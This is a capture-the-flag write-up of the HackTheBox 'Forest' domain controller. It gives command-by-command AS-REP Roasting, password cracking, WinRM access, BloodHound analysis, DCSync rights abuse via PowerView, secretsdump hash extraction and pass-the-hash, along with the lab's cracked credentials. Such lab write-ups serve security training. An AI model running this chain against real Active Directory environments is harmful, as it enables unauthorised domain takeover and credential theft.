# Forest — HackTheBox

| Field | Detail |
|---|---|
| Target IP | 10.129.95.210 |
| Domain | htb.local |
| OS | Windows Server (AD Domain Controller) |
| Difficulty | Medium |
| Date | April 2026 |
| Result | Domain Admin — full DC compromise |

## Summary

Domain Controller with Exchange installed and LDAP anonymous bind enabled. AS-REP Roasting on `svc-alfresco`, WinRM access, then privilege escalation through Account Operators → Exchange Windows Permissions → WriteDACL → DCSync.

## Attack Chain

| # | Technique | Result |
|---|---|---|
| 1 | LDAP anonymous bind | Valid domain user list |
| 2 | AS-REP Roasting | KRB5ASREP hash for `svc-alfresco` |
| 3 | John + rockyou | Cleartext: `s3rvice` |
| 4 | Evil-WinRM | Shell as `svc-alfresco` |
| 5 | BloodHound | Path: Account Operators → Exchange Windows Permissions |
| 6 | Add-DomainObjectAcl | DCSync rights on new user |
| 7 | secretsdump | All NTLM hashes |
| 8 | Pass-the-Hash | Shell as Administrator |

## Reconnaissance

```bash
echo "10.129.95.210 htb.local FOREST.htb.local" | sudo tee -a /etc/hosts
sudo nmap -sV -p- 10.129.95.210
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local"
```

Open ports: 53 (DNS), 88 (Kerberos), 389/3268 (LDAP), 445 (SMB), 5985 (WinRM).  
LDAP accepts anonymous connections → 312 objects returned.

## User Enumeration

```bash
impacket-GetADUsers -all -dc-ip 10.129.95.210 htb.local/
```

Real users: sebastien, lucinda, **svc-alfresco**, andy, mark, santi.  
`svc-alfresco` has `PasswordLastSet` updated same day — periodic auto-reset typical of service accounts.

## AS-REP Roasting

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.129.95.210 -no-pass
echo '$krb5asrep$23$svc-alfresco@HTB.LOCAL:[hash]' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# svc-alfresco : s3rvice
```

## Initial Access — WinRM

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
whoami /all
# Member of: BUILTIN\Account Operators
```

## BloodHound — Privilege Path

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local \
  -dc FOREST.htb.local -ns 10.129.95.210 -c all
```

Path identified:

```
svc-alfresco → Service Accounts → Privileged IT Accounts
→ Account Operators →[GenericAll]→ Exchange Windows Permissions
→[WriteDACL]→ htb.local domain
```

## Privilege Escalation — DCSync

```bash
# Create user and add to Exchange Windows Permissions
net user hacker Password123! /add /domain
net group "Exchange Windows Permissions" hacker /add /domain

# Load PowerView and grant DCSync rights
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice \
  -s /usr/share/windows-resources/powersploit/Recon/
PowerView.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\hacker', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" \
  -PrincipalIdentity hacker -Rights DCSync

# Dump all hashes
impacket-secretsdump 'htb/hacker:Password123!@10.129.95.210'
# htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6

# Pass-the-Hash
evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
type C:\Users\Administrator\Desktop\root.txt
```
